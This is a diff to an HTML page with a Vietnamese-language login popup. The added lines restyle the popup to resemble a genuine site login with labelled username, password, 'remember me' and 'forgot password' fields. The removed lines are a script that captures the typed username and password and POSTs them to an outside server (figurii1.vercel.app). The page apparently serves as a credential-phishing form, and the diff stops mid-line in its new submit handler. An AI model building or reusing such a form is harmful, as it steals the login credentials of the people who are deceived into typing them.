@@ -42,40 +42,66 @@
       border: 1px solid #ccc;
       padding: 30px 40px;
       box-shadow: 0 0 15px rgba(0,0,0,0.4);
-      width: 350px;
+      width: 400px;
     }
 
     .login-popup h3 {
       margin-top: 0;
       font-size: 22px;
-      text-align: center;
+      text-align: left;
+      color: #333;
     }
 
-    .login-popup input {
+    .login-popup label {
+      font-weight: bold;
+      font-size: 14px;
       display: block;
-      margin: 12px 0;
-      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 5px;
+    }
+
+    .login-popup input[type="text"],
+    .login-popup input[type="password"] {
       width: 100%;
+      padding: 10px;
       border: 2px solid #888;
-      border-radius: 4px;
-      font-family: Arial, sans-serif;
-      font-size: 15px;
+      border-radius: 3px;
+      background-color: #f0f7ff;
+      font-size: 14px;
     }
 
     .login-popup button {
-      width: 100%;
+      width: 150px;
       padding: 10px;
+      margin-top: 15px;
       background-color: #a00000;
       color: white;
+      font-weight: bold;
       border: none;
-      border-radius: 6px;
-      font-family: Arial, sans-serif;
-      font-size: 16px;
+      border-radius: 5px;
+      font-size: 14px;
       cursor: pointer;
     }
 
     .login-popup button:hover {
       background-color: #880000;
+    }
+
+    .login-popup .options {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .login-popup .options label {
+      margin: 0 0 0 5px;
+      font-weight: normal;
+    }
+
+    .login-popup .forgot {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #333;
     }
 
     .overlay-background {
@@ -113,11 +139,24 @@
   <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>
 
   <div class="login-popup" id="loginPopup">
-    <h3>Đăng nhập</h3>
+    <h3>ĐĂNG NHẬP</h3>
     <form id="loginForm">
+      <label for="username">Tên tài khoản hoặc địa chỉ email *</label>
       <input type="text" id="username" placeholder="Tên đăng nhập" required>
+
+      <label for="password">Mật khẩu *</label>
       <input type="password" id="password" placeholder="Mật khẩu" required>
-      <button type="submit">Đăng nhập</button>
+
+      <button type="submit">ĐĂNG NHẬP</button>
+
+      <div class="options">
+        <input type="checkbox" id="remember">
+        <label for="remember">Ghi nhớ mật khẩu</label>
+      </div>
+
+      <div class="forgot">
+        <a href="#">Quên mật khẩu?</a>
+      </div>
     </form>
   </div>
 
@@ -136,38 +175,4 @@
       document.getElementById('overlayBg').style.display = 'none';
     }
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://figurii1.vercel.app/api/submit', true); 
-      xhr.setRequestHeader('Content-Type', 'application/json');
-
-      xhr.onload = function() {
-        if (xhr.status >= 200 && xhr.status < 300) {
-          console.log('✅ Dữ liệu đã được gửi:', xhr.responseText);
-          hideLogin();
-
-          const msg = document.getElementById('successMessage');
-          msg.style.display = 'block';
-          setTimeout(() => {
-            msg.style.display = 'none';
-          }, 3000);
-        } else {
-          console.error('❌ Lỗi khi gửi dữ liệu:', xhr.statusText);
-        }
-      };
-
-      xhr.onerror = function() {
-        console.error('❌ Lỗi kết nối hoặc CORS bị chặn');
-      };
-
-      xhr.send(JSON.stringify({ username, password }));
-    });
-  </script>
-
-</body>
-</html>
+    document.getElementById('loginForm').addEventListener('
